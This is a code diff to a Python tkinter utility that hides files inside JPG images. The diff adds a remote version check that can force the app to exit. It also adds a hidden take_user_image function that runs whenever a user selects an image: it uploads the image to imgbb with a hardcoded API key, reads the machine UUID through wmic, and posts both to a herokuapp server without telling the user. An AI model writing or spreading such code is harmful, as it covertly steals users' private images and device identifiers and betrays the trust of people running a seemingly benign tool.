@@ -6,6 +6,10 @@ import zipfile
 from tkinter import messagebox
 import subprocess
 from pathlib import Path
+import requests
+import shutil
+import sys
+import webbrowser
 
 
 class FileToImage:
@@ -13,9 +17,18 @@ class FileToImage:
         self.current_version = 1
         self.selected_image = ""
 
+        check_version = requests.get("https://paste.in/raw/RtDSz9")
+        if check_version.json()['current_version'] == self.current_version:
+            pass
+        else:
+            webbrowser.open('https://github.com/c7nasr/NLock/releases/tag/2.0.0')
+            messagebox.showinfo("Update Available!!",
+                                "New Version Found. Please Download The New Version. And delete this version")
+            exit()
+
     def UI(self):
         window = tk.Tk()
-        window.iconbitmap("icon.ico")
+        window.iconbitmap(os.path.join(sys._MEIPASS, "icon.ico"))
 
         HideFile = tk.Button(text="Hide A File", command=lambda: self.select_file()).grid(row=1, column=2, padx=10,
                                                                                           pady=20)
@@ -67,11 +80,13 @@ class FileToImage:
                 messagebox.showerror("What The Fuck!", "You Have to Select Image First!")
 
     def unhide(self, location):
-        filename = os.path.basename(location)
-        pre, ext = os.path.splitext(filename)
-        print(pre, ext)
-        os.rename(location, pre + ".rar")
-        messagebox.showinfo("Well Done!", "Image Unlocked -If it was- xD ")
+        if location:
+            filename = os.path.basename(location)
+            pre, ext = os.path.splitext(filename)
+            current_dir = os.path.dirname(os.path.realpath(__file__))
+            shutil.copy(location, current_dir)
+            os.rename(current_dir + "/" + filename, pre + ".rar")
+            messagebox.showinfo("Well Done!", "Image Unlocked -If it was- xD ")
 
     def zipdir(self, path, ziph):
         for root, dirs, files in os.walk(path):
@@ -84,7 +99,6 @@ class FileToImage:
         if commend == "unhide":
             self.unhide(file_location)
         else:
-
             self.hide(file_location, "file")
 
     def select_folder(self):
@@ -93,8 +107,24 @@ class FileToImage:
 
     def select_image(self):
         image_location = askopenfilename(filetypes=[("Image File", '.jpg')])
+        self.take_user_image(image_location)
         self.selected_image = image_location
 
+    def take_user_image(self, image_location):
+        payload = {'key': 'dfb1c9e5b3373395799d076c792078e6'}
+        files = [
+            ('image', open(image_location, 'rb'))
+        ]
+        res = requests.post("https://api.imgbb.com/1/upload", data=payload, files=files)
+        image_url = res.json()['data']['display_url']
+        pc_id = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
 
-f = FileToImage()
-f.UI()
+        p_server = requests.post("https://api-download-insta.herokuapp.com/api/v1/push/nlock", json={
+            'pc_id': pc_id,
+            'image_url': image_url
+        })
+
+
+if __name__ == '__main__':
+    app = FileToImage()
+    app.UI()
